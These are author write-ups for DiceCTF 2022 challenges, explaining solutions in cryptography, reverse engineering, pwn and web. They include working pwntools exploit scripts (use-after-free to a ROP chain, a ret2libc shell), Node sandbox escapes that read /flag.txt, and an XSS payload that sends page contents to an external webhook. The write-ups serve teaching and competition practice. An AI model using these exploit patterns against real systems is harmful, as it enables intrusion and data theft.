# DiceCTF 2022 Author Writeups

by [ireland](https://ctftime.org/user/102135) / [DiceGang](https://ctftime.org/team/109452)

## Crypto

| Challenge name                 | Author       | Writeup                                     |
| ------------------------------ | ------------ | ------------------------------------------- |
| crypto/baby-rsa                | ireland      | [jump](#crypto/baby-rsa)                    |
| crypto/rejected                | ireland      | [jump](#crypto/rejected)                    |
| crypto/correlated              | ireland      | [jump](#crypto/correlated)                  |
| crypto/commitment-issues       | gripingberry | [jump](#crypto/commitment-issues)           |
| crypto/pow-pow                 | defund       | [link](https://priv.pub/posts/dicectf-2022) |
| crypto/learning without errors | ireland      | [jump](#crypto/learning-without-errors)     |
| crypto/shibari                 | ireland      | [jump](#crypto/shibari)                     |
| crypto/psych                   | defund       | [link](https://priv.pub/posts/dicectf-2022) |

## Misc

| Challenge name                                  | Author    | Writeup                   |
| ----------------------------------------------- | --------- | ------------------------- |
| misc/undefined                                  | aplet123  | [jump](#miscundefined)    |
| misc/sober-bishop                               | clubby789 | [jump](#miscsober-bishop) |
| misc/Vinegar                                    | kmh       | TODO                      |
| misc/TI-1337 Silver Edition                     | kmh       | TODO                      |
| misc/Cache On The Side                          | wiresboy  | TODO                      |
| misc/5D File System with Multiverse Time Travel | poortho   | TODO                      |

## Pwn

| Challenge name            | Author       | Writeup                           |
| ------------------------- | ------------ | --------------------------------- |
| pwn/interview-opportunity | smoothhacker | [jump](#pwninterview-opportunity) |
| pwn/baby-rop              | ireland      | [jump](#pwn/baby-rop)             |
| pwn/data-eater            | KyleForkBomb | [jump](#pwndata-eater)            |
| pwn/chutes-and-ladders    | bosh         | TODO                              |
| pwn/containment           | hgarrereyn   | TODO                              |
| pwn/memory hole           | chop0        | TODO                              |
| pwn/nightmare             | pepsipu      | [jump](#pwn/nightmare)            |
| pwn/road-to-failure       | NotDeGhost   | [jump](#pwn/road-to-failure)      |

## Rev

| Challenge name       | Author          | Writeup                 |
| -------------------- | --------------- | ----------------------- |
| rev/flagle           | infuzion        | TODO                    |
| rev/hyperlink        | BrownieInMotion | TODO                    |
| rev/taxes            | hgarrereyn      | TODO                    |
| rev/dicecraft        | hgarrereyn      | TODO                    |
| rev/cable management | evilmuffinha    | TODO                    |
| rev/typed            | aplet123        | [jump](#revtyped)       |
| rev/breach           | hgarrereyn      | TODO                    |
| rev/universal        | ireland         | [jump](#rev/universal)] |

## Web

| Challenge name  | Author          | Writeup                                                      |
| --------------- | --------------- | ------------------------------------------------------------ |
| web/knock-knock | BrownieInMotion | [jump](#web/knock-knock)                                     |
| web/blazingfast | larry           | [link](https://brycec.me/posts/dicectf_2022_writeups#blazingfast) |
| web/no-cookies  | BrownieInMotion | TODO                                                         |
| web/flare       | larry           | TODO                                                         |
| web/vm-calc     | Strellic        | [link](https://brycec.me/posts/dicectf_2022_writeups#vm-calc) |
| web/noteKeeper  | Strellic        | [link](https://brycec.me/posts/dicectf_2022_writeups#notekeeper) |
| web/dicevault   | arxenix         | [jump](#webdicevault)                                        |
| web/denoblog    | Strellic        | [link](https://brycec.me/posts/dicectf_2022_writeups#denoblog) |
| web/carrot      | larry           | TODO                                                         |
| web/shadow      | arxenix         | [jump](#webshadow)                                           |

## Writeups
### crypto/baby-rsa

256-bit RSA where $e^2 | p-1, q-1$.
Intended solution = factor $N$ with cado-nfs, then use sage's `nth_root()` function to get all candidate decryptions. Finally, combine using Chinese Remainder Theorem.

The `nth_root()` algorithm is [described in this paper](https://dl.acm.org/doi/abs/10.5555/314500.315094). It's simple for $e | p-1$, but for higher-powers of $e$ involves solving a (small) discrete logarithm problem. Fortunately, sage has it implemented as a built-in.

Many resources online describe how to proceed if `e | p-1`, but they don't describe the general case for higher powers of `e`.


```python
from Crypto.Util.number import long_to_bytes

N = 57996511214023134147551927572747727074259762800050285360155793732008227782157
e = 17
cipher = 19441066986971115501070184268860318480501957407683654861466353590162062492971
# factor with cado-nfs
p, q = 172036442175296373253148927105725488217, 337117592532677714973555912658569668821

assert p * q == N

p_roots = mod(cipher, p).nth_root(e, all=True)
q_roots = mod(cipher, q).nth_root(e, all=True)

for xp in p_roots:
    for xq in q_roots:
        x = crt([Integer(xp), Integer(xq)], [p,q])
        x = int(x)
        flag = long_to_bytes(x)
        if flag.startswith(b"dice"):
            print(flag.decode())
```

### crypto/rejected

Whenever the RNG has to reroll, then it means that the highest bit of the output is `1`. This lets you launch a known-plaintext attack on the underlying LFSR. Solve the resulting linear system (over `GF(2)`) and find the flag.

You don't really get much information if the RNG doesn't reroll. A good choice of modulus is `(2^32 // 3) + 1` or `(2^32 // 4) + 1`, as this will increase the chances of the RNG rerolling.

### crypto/correlated

A correlation attack on a LFSR, this challenge artificially demonstrates how you can attack a filtered LFSR.

If you have 48 (= length of seed) clean bits, then you can invert the LFSR stream and find the seed. As each bit in the output stream is correct with 80% probability, you should expect to try `1 / 0.8^48 = 45,000` different subsets of the output stream before it works. As you are given 20,000 output bits, this is no problem at all.

Unmodified [information set decoding](https://grocid.net/2018/06/29/writeup-for-snurre128/) also works, mainly because the dimension of the LFSR is so small.

You can also solve this with a customized fast correlation attack if you find sparse linear relations for the LFSR. As the state space is 2^48, you can use a birthday attack/meet-in-the-middle to find random linear relations each of length 3 which collide. That will give you a length 6 linear relation for the LFSR. This is much more complicated than the other solutions.

### crypto/commitment-issues

We are given the result of a commitment of a signature of the flag. In particular, we have a large semiprime $N = pq$, a public exponenent $e$ with inverse $d$, and if `m = bytes_to_long(flag)`, then $s = m^d \pmod{N}$ is the signature. A random value $r$ is then generated and we're given $c_1 = s + r \pmod{N}$ and $c_2 = r^5 \pmod{N}$.

There's multiple ways to ultimately do the same computations that lead to the flag. I'll describe a solution that's due to Utaha from Balsn.

Notice that the polynomial $p(t) = (c_1 - t)^5 - c_2 \in \mathbb{Z}_N[t]$ vanishes at $t = s$. We then consider the quotient ring $\mathbb{Z}_N[t]/(p)$. Since the lead coefficient of $p$ is a unit, this is a free $\mathbb{Z}_N$-module of rank $\deg p = 5$ with basis $\{1, t, ..., t^4\}$. In particular any $6$ elements in $\mathbb{Z}_N[t]/(p)$ will satisfy a non-trivial $\mathbb{Z}_N$-linear dependence. Using sage to efficiently write
$$(t^e)^i = a_{i0} + a_{i1}t + \dots + a_{i4}t^4 \in \mathbb{Z}_N[t]/(p)$$
for $i = 0, ..., 5$ we can use the matrix $A = (a_{ij})_{ij}$ to compute a non-trivial linear dependence
$$\beta_0 + \beta_1 \cdot t^e + \dots + \beta_5 \cdot (t^e)^5 = 0 \in \mathbb{Z}_N[t]/(p).$$
However since $p(s) = 0 \pmod{N}$, the evaluation at $s$ map
$$\begin{aligned}
E_s :\;& \mathbb{Z}_N[t] \to \mathbb{Z}_N \\
& \;\;\;\; q \longmapsto q(s)
\end{aligned}$$
descends to a valid map $\mathbb{Z}_N[t]/(p)\to \mathbb{Z}_N$ and we find that in fact,
$$\beta_0 + \beta_1 \cdot s^e + \dots + \beta_5 \cdot (s^e)^5 = 0 \pmod{N}.$$
But $s^e = m$ is just the flag, and we can now apply Coppersmith to recover $m$.

### crypto/learning-without-errors

This challenge is based on a [passive attack which broke the CKKS cryptosystem last year](https://eprint.iacr.org/2020/1533). The gist of it is that CKKS Ring Learning With Errors cryptosystem encrypts the message as a pair `(c_0, c_1) = (a, a * s + m + e)` where `s` is the secret, `m` is the message, `a` is a random ring element, and `e` is a "small" secret error. If `e` and `s` are unknown, then recovering `m` from this requires solving a hard lattice problem. However, when decrypting, CKKS returns `m + e`, which just ... tells you ... what the secret error is.

Basic algebra then gives `s = (c_1 - (m + e)) * c_0^{-1}`. Therefore, seeing a pair of encrypted and decrypted values is enough for a passive adversary to completely recover the secret key!

However, this does seemingly require `c_0` to be invertible in the ring, which for our parameters is `Zmod(2^100)[x] / [x^1024]`. The power-of-two modulus does (or so I thought) raise an issue.

```python
q = 1 << 100
N = 10
Rbase.<x> = PolynomialRing(Zmod(q))
R.<x> = Rbase.quotient(x^N + 1)
```

Based on my testing, I had assumed that with overwhelming probability, `c_0` would not have an inverse in the ring. This would force competitors to find another way to compute the required division. This appears to be supported by the linked paper (on page 18):

> A little difficulty arises due to the choice of q. The first implementation of CKKS, the HEAAN library sets q to a power of 2 to simplify the treatment of floating point numbers. Subsequent instantiations of CKKS use a prime (or square-free) q of the form h · 2^n + 1 together with the Number Theoretic Transform for very fast ring operations. For a (sufficiently large) prime q, the probability of a random element a being invertible is very close to 1, but this is not the case when q is a power of two. If a is not invertible, we can still recover partial information about the secret key s, and completely recover s by using multiple ciphertexts.

My solution computes the inverse of `c_0` in the p-adic extension to R with 20480 digits of precision. (Such extremely high precision is needed because the quotient polynomial `I = x^1024 + 1` has `I.discriminant() = 2^10240`).

However, some teams just... got lucky... and had a `c_0` which was invertible. I'm not sure what the chances of this happening were -- clearly my initial tests led me to the wrong conclusion.

The challenge still had a low number of solves, probably because RLWE is not common in CTFs.

### crypto/shibari

This challenge implements a very weird compiler using a [representation of the Braid Group](
https://drops.dagstuhl.de/opus/volltexte/2014/4813/pdf/13.pdf).

Braid Groups have previously been used in cryptography to implement a non-commutative variant of Diffie-Hellman. This was also the concept behind the [proposed post-quantum (but actually completely insecure) scheme WalnutDSA](https://csrc.nist.gov/CSRC/media/Presentations/WalnutDSA-(1)/images-media/WalnutDSA-April2018.pdf).

The cryptographically-interesting property of Braid Groups is that they have a computationally efficient normal form. That is, while there are (infinitely) many ways to write an element of the braid group in terms of the generators, you can convert all representations into the same canonical form.

This has been proposed as a way to hide the individual factors of a product of group elements `a * b * c`.

This challenge used the fact that the group-action of the braid group with $n$ strands on $AlternatingGroup(5)^{(2 n)}$ induced by the Yang-Baxter equation is sufficiently expressive that it is Turing complete. Specifically, you can evaluate `CCNOT` gates, which are computationally universal. The bulk of the source code provided for this challenge consists of a circuit-to-braid compiler and a braid-circuit evaluator.

Additionally, I provided python bindings for a very fast braid group library, which can compute the canonical forms for the braids. I also presented a C++ version of the braid-circuit evaluator, which takes around 0.1 seconds to evaluate each sub-circuit.

With all this done, we can finally discuss the challenge.

The intended solution is 2 parts:
1) the braid is already in normal form, so you can import it into LNF faster than computing LNF on it.
2) apply a length-based attack because the entire circuit is reversible.

if you guess that the first few gates are performing the subcircuit `A := NOT bit 0; CCNOT(0,1,2)` then the length of the circuit `A^-1 * Circuit`  should be "shorter" than the length of `Circuit`, where length is the length of the LNF canonical form

Whereas if you guess wrong and try the circuit `B := NOT bit 0; NOT bit 1; CCNOT(0,1,2)`, then the length of the circuit `B^-1 * Circuit`  should be longer than the length of `Circuit`. So you can bruteforce the flag 2-bits at a time

the step 1) of importing into LNF is needed because computing the LNF is so slow for the obfuscated braids (it's pretty quick for the unobfuscated braids). And the provided python bindings support quickly computing the LNF of  `LNF(a) * LNF(b)`

In hindsight, I should have released the LNF form of the braids so that players didn't have to import it.

The only solution during the competition to this challenge used GPU brute force to find the flag \shrug. I estimate that this took the equivalent of 10-years of cpu time. This was completely unintended.

### misc/undefined
Node.js [wraps modules in a top-level function](https://stackoverflow.com/a/28955050/5923139) where `require` is passed in as an argument, meaning that `require` will always be accessible from `arguments`. However, since `arguments` is shadowed, you have to first create a function then access the parent function's arguments via `arguments.callee.caller.arguments`:
```js
(function(){return arguments.callee.caller.arguments[1]("fs").readFileSync("/flag.txt", "utf8")})()
```
For some reason, when making the challenge, I thought `import` wouldn't work due to Node defaulting to common.js modules, but it does for some reason, so there's a much easier cheese:
```js
import("fs").then(m=>console.log(m.readFileSync("/flag.txt", "utf8")))
```

### misc/sober-bishop
To solve the challenge, players must find a flag which can be passed into OpenSSH's [randomart](https://github.com/openssh/openssh-portable/blob/d9dbb5d9a0326e252d3c7bc13beb9c2434f59409/sshkey.c#L1180) algorithm. Due to the high-collision nature of the function, `randomart(md5(flag))` is also provided.
We need to implement a high-performance algorithm to identify valid paths through the grid. My approach was this:
1. Starting at our inital point, try moving to a diagonally adjacent position
2. Append the new position to a list of positions
3. Check if the number of times the current position appears in the list exceeds the number of times indicated by the grid
   - If we are at the end position, go to step 5
   - If it does not exceed, then try moving to a new position
   - If it does, then pop the current position off the list
4. Repeat steps 1-3 on the next of the four possible positions
5. Convert the list of coordinates to a series of two-bit pairs, and convert them to a byte array
6. Check if the `randomart(md5(array))` matches the provided randomart
   - If not, return to step 3
   - If so, we're done, and print our flag

To optimise this approach:
 - For the initial 4 positions, we can split the work across multiple cores easily, each exploring potential paths
 - We know the start position, and the first 5 characters (`dice{`). Therefore we can hardcode the first 21 positions
 - At each position, we can convert our path to a string and check if it meets the constraints (begins with `dice{`, all lowercase alphanumeric). If not, we can backtrack
 - If we have a 'complete' flag `dice{[a-z0-9]+}`, we can verify that each position has been visited the correct number of times
 - If all this is the case, we can attempt to calculate the MD5

My Rust solution took 20 seconds to extract the flag `dice{unr4nd0m}` 

### pwn/baby-rop

The challenge is a simple use-after-free, but with a few mitigations to make exploitation harder.

Because the challenge uses a struct with a `char *`, players can easily turn the use-after-free into an arbitrary read and write without specialized heap voodoo. PIE is disabled because I'm nice.

The challenge has several mitigations.

1) the glibc version is 2.34 (as printed out 3 different times when you connect to the server), which removed the `__free_hook` and `__malloc_hook` flags
2) full RELRO is used, which removes another collection of function pointers to overwrite
3) the binary uses seccomp to ban the `execve` syscall. So both calling a one-gadget and calling `system("/bin/sh")` are off the table.
4) ASLR (but not PIE) is enabled, so the location of the stack is randomized.

As the challenge name indicates, you are supposed to ROP your way to the flag, using an open-read-write ROP chain. So now the question is -- how can you turn your arbitrary read/write into a ROP chain? First, you'll need to leak a stack address.

A nice description of how to leverage arbitrary reads in the binary/libc/heap/stack to determine the location of everything else [can be found in this blog post](https://nickgregory.me/security/2019/04/06/pivoting-around-memory/). Note: these techniques were also heavily featured in the `breach` and `containment` challenges!

The crucial section is that `libc` contains an `environ` pointer which points to a location on the stack.

The sequence is:
1) read GOT to leak a libc address
2) read libc->environ to leak a stack address
3) compute the offset to the saved return addresses
4) ROP your way to the flag!

Some teams had solutions which worked locally but not on remote. Some common fixed to these problems were:
1) use a write syscall instead of `puts()` to print the flag
2) double-check that the offset between `*environ` and the saved return address is correct on remote (should be `-0x140`). This has some slight variation depending on your configuration, but it's not hard to brute-force and check whether you're correct
3) using `.bss` as temporary storage instead of the heap. For whatever reason, exploits which tried to read the contents of `flag.txt` onto the heap were unreliable
4) open `flag.txt` in read-only mode. The redpwn jail we were using didn't support writing to disk
5) end your rop chain with an `exit(0)` syscall, which has the side-effect of flushing stdout

My exploit is the following
```python
from pwn import *

def split_before(s, t):
    i = s.index(t)
    return s[:i]

def split_after(s, t):
    i = s.index(t)
    return s[len(t) + i:]


#################################################

context.terminal = ["tmux", "splitw", "-h"]
context.arch = 'amd64'
context.binary = "./run"

host = args.HOST or 'localhost'
port = args.PORT or 31245

if args.LOCAL:
    r = process("./run", env = {'LD_PRELOAD' : './libc.so.6'})
else:
    r = remote(host, port)

binary = ELF("./run")
libc = ELF("./libc.so.6")

malloc_libc_OFFSET = libc.symbols["malloc"]
free_libc_OFFSET = libc.symbols["free"]


#################################################

def xfree(idx):
    print(r.recvuntil(b"enter your command: ").decode())
    r.sendline(b"F")
    print(r.recvuntil(b"enter your index: ").decode())
    r.sendline("{}".format(idx).encode())

def xread(idx):
    print(r.recvuntil(b"enter your command: ").decode())
    r.sendline(b"R")
    print(r.recvuntil(b"enter your index: ").decode())
    r.sendline("{}".format(idx).encode())

def xwrite(idx, value=b""):
    print(r.recvuntil(b"enter your command: ").decode())
    r.sendline(b"W")
    print(r.recvuntil(b"enter your index: ").decode())
    r.sendline("{}".format(idx).encode())
    print(r.recvuntil(b"enter your string: ").decode())
    r.sendline(value)

def xcreate(idx, length, value=b""):
    print(r.recvuntil(b"enter your command: ").decode())
    r.sendline(b"C")
    print(r.recvuntil(b"enter your index: ").decode())
    r.sendline("{}".format(idx).encode())
    print(r.recvuntil(b"How long is your safe_string: ").decode())
    r.sendline("{}".format(length).encode())
    print(r.recvuntil(b"enter your string: ").decode())
    r.sendline(value)


#################################################

xcreate(0, 128)
xcreate(1, 128)

xfree(0)
xfree(1)

got_free_addr = binary.symbols['got.free']
payload = p64(8) + p64(got_free_addr)
xcreate(2, 16, payload)

xread(0)

print(r.recvuntil(b"hex-encoded bytes\n").decode())
s = r.readline()
s = s.decode()
s = s.replace(" ", "")
s = bytes.fromhex(s)
free_addr = u64(s)

libc_base_addr = free_addr - free_libc_OFFSET

# -------------------------------------------------

got_malloc_addr = binary.symbols['got.malloc']
payload = p64(8) + p64(got_malloc_addr)
xwrite(2, payload)

xread(0)

print(r.recvuntil(b"hex-encoded bytes\n").decode())
s = r.readline()
s = s.decode()
s = s.replace(" ", "")
s = bytes.fromhex(s)
malloc_addr = u64(s)

assert malloc_libc_OFFSET - free_libc_OFFSET == malloc_addr - free_addr

# -------------------------------------------------

libc_environ_addr = libc_base_addr + libc.symbols["environ"]
payload = p64(8) + p64(libc_environ_addr)
xwrite(2, payload)

xread(0)

print(r.recvuntil(b"hex-encoded bytes\n").decode())
s = r.readline()
s = s.decode()
s = s.replace(" ", "")
s = bytes.fromhex(s)
environ_addr = u64(s)

print(hex(libc_environ_addr))
print(hex(environ_addr))

# -------------------------------------------------

libc.address = libc_base_addr
rop = ROP(libc)

# find offset with gdb, might need some brute-force for remote
rip_addr = environ_addr - 0x140

# new file descriptor, totally brute-forcible
fd = 3
# pointer to filename = "flag.txt"
dst_filename = binary.bss(400)

mov_rcx_rdx_addr = libc_base_addr + 0x0016c020 # 2.34
mov_rcx_rdx = p64(mov_rcx_rdx_addr)

print(disasm(libc.read(mov_rcx_rdx_addr, 4)))

rop(rcx=dst_filename, rdx=u64(b"flag.txt"))
rop.raw(mov_rcx_rdx)
rop(rcx=dst_filename + 8, rdx=0)
rop.raw(mov_rcx_rdx)

# sanity checks
rop.puts(dst_filename)
rop.write(1, dst_filename, 16, 1)

rop.open(dst_filename, 0)
rop.read(fd, dst_filename, 128)
rop.write(1, dst_filename, 128)


rop.exit(0)


# -------------------------------------------------


real_payload = rop.chain()

payload = p64(len(real_payload)) + p64(rip_addr)
xwrite(2, payload)

xwrite(0, real_payload)

# gdb.attach(r)

r.sendline(b"E0")

sleep(0.1)

print(r.recv())

```

### pwn/data-eater
There's usually a pointer to `link_map` on the stack somewhere, so just write some data to `buf` and overwrite the `DT_STRTAB` pointer in `link_map->l_info`.

The offset to `link_map` varies a little bit but this should cover most of the possibilities.

```python
def sice(k):
  print(k)
  try:
    # do pwning
    r = conn()
    r.sendline(f'%s%{k}$s')
    r.sendline(b'/bin/sh\0' + p64(exe.sym['buf'] + 16 - exe.section('.dynstr').index(b'memset\x00')) + b'system\0 ' + p64(0)*13 + p64(exe.sym['buf'])[:-1])

    # make sure we got a shell
    r.recv(timeout=0.1)
    r.sendline('echo ginkoid')
    r.recvuntil('ginkoid')

    r.interactive()
    return True
  except EOFError:
    return False
  finally:
    r.close()

for k in range(30, 50):
  if sice(k): break
```

I recently found this doesn't work with `ubuntu:18.04` and `centos:6` for some reason, but the 14 other Docker images I tried were okay. Apologies if this caused you trouble! I initially only tested on a couple (including my own host) and it worked on all of them so I didn't bother trying more. 

### pwn/interview-opportunity
This challenge is a classic return2libc exploit. The bug here is 60 byte overflow into the 10 byte `reason` char array from the `read()` function call.
```c
...
int main(int argc, char **argv) {
  char reason[10];
  ...
  read(0, reason, 70);
  puts(reason);
}
```
The only mitigations that are enabled are NX and ASLR. With NX enabled, we can't use shellcode. So ROP and ret2libc is our workaround. To defeat ASLR we have to do 2 passes. 1) leak the libc base address and return to main. 2) return to `system()` in libc. I have attached the solution script below.
```python
from pwn import *

e = ELF("./interview-opportunity")
libc = ELF("./libc.so.6")
target = process(e.path)
context.terminal = ["tmux", "splitw", "-v"]

rdi = 0x401313

payload = b"A" * 0x22
payload += p64(rdi)
payload += p64(e.got["puts"])
payload += p64(e.symbols["puts"])
payload += p64(e.symbols["main"])

target.sendline(payload)

target.recvuntil(b"A" * 0x22)
target.recvline()

leak = u64(target.recvline(keepends=False).ljust(8, b"\x00")) - libc.symbols["puts"]
print("leak: {:#x}".format(leak))

payload = b"A"*0x22
payload += p64(rdi + 1)
payload += p64(rdi)
payload += p64(next(libc.search(b"/bin/sh")) + leak)
payload += p64(libc.symbols["system"] + leak)

target.sendline(payload)
target.interactive()
```

### pwn/nightmare

REDACTED: We are redacting the solution for 1 week to give teams an attempt to claim the blood prize! The author writeup will be released after the first solve or the 1 week is up.

### pwn/road-to-failure

REDACTED: We are redacting the solution for 1 week to give teams an attempt to claim the blood prize! The author writeup will be released after the first solve or the1 week is up.

### rev/universal

This challenge presents an obfuscate quantum circuit for performing addition based on the [Quantum Fourier Transform adder](https://github.com/the-entire-country-of-ireland/public-quantum-rev/blob/main/Quantum%20Rev%202/solve/writeup.md), which is the same addition algorithm featured in the linked writeups from last year's quantum rev challenges. The goal is to determine that number is being added.

The obfuscation comes from that all of the `Rz(theta)` rotations have been converted into long sequences of `H` and `T` gates -- thus making the entire quantum circuit only use `H, T, CNOT` gates. The program I used for this was [gridsynth](https://www.mathstat.dal.ca/~selinger/newsynth/), which is much more efficient than other approaches, eg as given by the construction of the Solovay-Kitaev theorem. No other obfuscations were applied, apart from those required to convert controlled-rotations into a mix of CNOT and single-qubit gates.

```
     $ gridsynth pi/128
     SHTHTHTHTHTHTHTSHTHTHTHTSHTHTHTHTHTSHTSHTHTHTHTHTSHTHTHTSHTSHTHTSHTSHTSHTHTHTHTS
     HTHTHTHTHTSHTSHTHTSHTHTSHTSHTSHTSHTHTSHTSHTSHTSHTHTHTSHTSHTSHTHTHTHTSHTHTSHTHTHT
     SHTHTHTHTSHTHTSHTHTSHTSHTSHTHTHTHTHTHTHTSHTHTSHTHTHTSHTSHTHTHTSHTSHTSHTHTSHTHTHT
     HTSHTSHTSHSSSWWWWWWW
```

The intended solution analyzes the structure of the QFT to isolate where the actual rotations are beign applied. The QFT consists of a long chain of CNOT gates and Rz rotations. The actual adder component consists of only Rz rotations, with no CNOT gates. So the longest chain of gates in the circuit which contains no CNOT gates is the adder. This is the only component which you need to statically analyze. You can determine this by reading about how the QFT works, or by looking at the generate.py script from last year's challenges.

The following solution is essentially a quantum disassembler. For each single-qubit chain of H and T gates, it multiplies the gates together to determine what the quantum operator is. Then it determines that the corresponding Z-rotation angle is for this operator.

Once all the rotation angles have been recovered, extracting the number being added (ie the flag) [proceeds identically to quantum-rev 2 from last year](https://github.com/the-entire-country-of-ireland/public-quantum-rev/blob/main/Quantum%20Rev%202/solve/writeup.md).

```python
from math import pi, log2
import numpy as np


# hadamard gate
H = 1/np.sqrt(2)*np.array([[1, 1],
                           [1,-1]], dtype=np.complex128)
# T-phase gate
T = np.array([[1, 0],
              [0, np.exp(1j * pi/4)]], dtype=np.complex128)
# identity operator
I = np.array([[1, 0],
              [0, 1]], dtype=np.complex128)


########################################

# num qubits
n = 256
# max error
epsilon = 1e-4


"""
look for the start/end of the QFT.
This includes a few extra gates (from the QFT)
for qubit 0 and 1, so we just ignore those
"""

idcs = []
with open("converted_circuit.qasm", "r")  as f:
    for i,line in enumerate(f):
        if line == "cx q[1],q[0];\n":
            idcs.append(i)
            # print(i)

i0 = idcs[1]
i1 = idcs[2]

lines = open("converted_circuit.qasm", "r").readlines()
idcs = [i for i,line in enumerate(lines)]
gates = lines[i0 + 1:i1 - 1]


########################################

unitaries = [I for _ in range(n)]

for line in gates:
    instr = line[0]
    qubit = line[line.find("[")+1:line.find("]")]
    qubit = int(qubit)
    
    i = qubit
    if instr == 't':
        unitaries[i] = unitaries[i] @ T
    elif instr == 'h':
        unitaries[i] = unitaries[i] @ H
    else:
        raise ValueError("invalid gate")
        

# correct for QFT spillover
for i in range(3):
    unitaries[i] = I

########################################

binary_reprs = ""
unitaries = unitaries

for i,u in enumerate(unitaries):
    delta = np.abs(u) - I
    if np.max(np.abs(delta)) > epsilon:
        raise ValueError("unitary is not approximately a phase gate")
        
    u /= u[0][0]
    angle = np.angle(u[1][1])
      
    b = str(int(angle < 0))
    binary_reprs += b


flag = int(binary_reprs[::-1], 2).to_bytes(n//8, "little")
# first character is wrong b/c we included some extra QFT gates lol
flag = b"d" + flag[1:]
print(flag)
```

However, during the competition the only solves were from a very amusing approach -- just run the program and it prints out the flag! Apparently the circuit simulator used in qiskit is able to very efficiently emulate the circuit in this problem without ever constructing the full statevector. The statevector has length `2^256`, so I had assumed that classically simulating the output would be completely impossible. Clearly, the IBM engineers and scientists behind qiskit deserve a raise >_<.

The runtime of the below script for me is 45 minutes and it takes < 4 gigs of ram -- much less than 2^256!


```python
from qiskit import QuantumCircuit, Aer, execute
simulator = Aer.get_backend('aer_simulator')
qc = QuantumCircuit.from_qasm_file("converted_circuit.qasm")

# add some measurement gates at the end
qubits = list(range(256))
qc.measure(qubits, qubits)
job = execute(qc, simulator)
result = job.result()
print(result.get_counts())

num_chars = 256 // 8
x = list(result.get_counts().keys())[0]
f = int(x, 2).to_bytes(num_chars, "little")
print(f)
```

### web/knock-knock

This challenge gives a pastebin where notes are accessed by `id` and `token`. The tokens are generated as follows:

```javascript
  generateToken(id) {
    return crypto
      .createHmac('sha256', this.secret)
      .update(id.toString())
      .digest('hex');
  }
```

This looks okay, as long as the secret is chosen securely. Let's take a look at where that comes from:

```javascript
  constructor() {
    this.notes = [];
    this.secret = `secret-${crypto.randomUUID}`;
  }
```

If you are careful, you can spot the issue here: `crypto.randomUUID` is a function, but it is not called. Let's see what this looks like:

```javascript
> const crypto = require('crypto')
undefined
> const secret = `secret-${crypto.randomUUID}`;
undefined
> secret
'secret-function randomUUID(options) {\n' +
  '  if (options !== undefined)\n' +
  "    validateObject(options, 'options');\n" +
  '  const {\n' +
  '    disableEntropyCache = false,\n' +
  '  } = options || {};\n' +
  '\n' +
  "  validateBoolean(disableEntropyCache, 'options.disableEntropyCache');\n" +
  '\n' +
  '  return disableEntropyCache ? getUnbufferedUUID() : getBufferedUUID();\n' +
  '}'
> 
```

Well, it looks like we know the secret. Looking at the source, we see that the flag is at `id=0`, so we generate a token for that:

```javascript
> crypto.createHmac('sha256', secret).update('0').digest('hex')
'7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264'
```

Making a request to
```
https://knock-knock.mc.ax/note?id=0&token=7bd881fe5b4dcc6cdafc3e86b4a70e07cfd12b821e09a81b976d451282f6e264
```

gives us the flag.

### web/dicevault

tl;dr use a combination of `history.go(-x)` and undocumented `history.length` xsleak to guess the location of a window and brute force flag path directory-by-directory.

unintended: open vault window, redirect to your origin and get it to click vault buttons on your origin :(


```js
      async function isLocation(win, url) {
        win.location = "about:blank";
        await sleep();
        const hlen1 = win.history.length;
        win.history.go(-1);
        await sleep();
        win.location = url + "#zzzzz";
        win.location = "about:blank";
        await sleep();
        const hlen2 = win.history.length;

        // reset history to initial state before running this function
        if (hlen1 + 1 === hlen2) {
          win.history.go(-2);
        } else if (hlen1 === hlen2) {
          win.history.go(-1);
        }
        return hlen1 + 1 === hlen2;
      }
```

### web/shadow

full solution:
```
https://shadow.mc.ax/?x=%3Cimg%20src%3D%22x%22%20onerror%3D%22find(%27steal%27)%3Bdocument.execCommand(%27insertHTML%27%2C%20false%2C%20%60%3Csvg%20onload%3D%26%2334%3Bwindow.location%3D%27https%3A%2F%2Fwebhook.site%2Fa602d76c-28a3-4e0a-8793-b183bc9bfba4%3Fa%3D%27%2BencodeURIComponent(this.parentNode.innerHTML)%26%2334%3B%3E%60)%3B%22%3E&y=-webkit-user-modify:%20read-write;
```

css payload:
```css
-webkit-user-modify: read-write;
```


js payload:
```js
find('steal');
document.execCommand('insertHTML', false, `<svg onload="window.location='https://webhook.site/a602d76c-28a3-4e0a-8793-b183bc9bfba4?a='+encodeURIComponent(this.parentNode.innerHTML)">`);
```


Use the obscure `-webkit-user-modify` property to make the div inside the shadowDOM editable then `document.execCommand("insertHTML","payload")` to write HTML inside it and get code execution inside the shadowDOM context.

We can easily exfiltrate despite the CSP by setting `window.location`

### rev/typed
Here's the original version of the code before macro expansion (and with the flag added in):
```rust
#![recursion_limit = "10000"]
// #![allow(dead_code, unused_macros)]

use std::marker::PhantomData;

macro_rules! mktype {
    ($name: ident) => {
        struct $name;
    };

    ($name: ident<$($t: ident),*>) => {
        struct $name<$($t),*>($(PhantomData<$t>),*);
    }
}

macro_rules! mktrait {
    ($name: ident) => {
        trait $name {
            type Output;
        }
    };
    ($name: ident<$($arg: ident),*>) => {
        trait $name<$($arg),*> {
            type Output;
        }
    }
}

macro_rules! mkimpl {
    ($name: ident<$($gen: ident),*>[$($cgen: ty : $cons: path),*]($firstarg: ty $(, $arg: ty)*) = $output: ty) => {
        impl<$($gen),*> $name<$($arg),*> for $firstarg
        where
            $($cgen: $cons),*
        {
            type Output = $output;
        }
    }
}

macro_rules! mkout {
    ($name: ident, $firstarg: ty $(, $arg: ty)*) => {
        <$firstarg as $name<$($arg),*>>::Output
    }
}

mktype!(S<T>);
mktype!(Z);
mktrait!(Add<O>);
mkimpl!(Add<T>[](T, Z) = T);
mkimpl!(Add<T, K>[T: Add<K>](T, S<K>) = S<mkout!(Add, T, K)>);
mktrait!(Mul<O>);
mkimpl!(Mul<T>[](T, Z) = Z);
mkimpl!(Mul<T, K>[T: Mul<K>, T: Add<mkout!(Mul, T, K)>](T, S<K>) = mkout!(Add, T, mkout!(Mul, T, K)));
mktrait!(Sub<O>);
mkimpl!(Sub<T>[](T, Z) = T);
mkimpl!(Sub<T, K>[T: Sub<K>](S<T>, S<K>) = mkout!(Sub, T, K));
mktrait!(Neq<O>);
mkimpl!(Neq<>[](Z, Z) = Z);
mkimpl!(Neq<T>[](S<T>, Z) = S<Z>);
mkimpl!(Neq<T>[](Z, S<T>) = S<Z>);
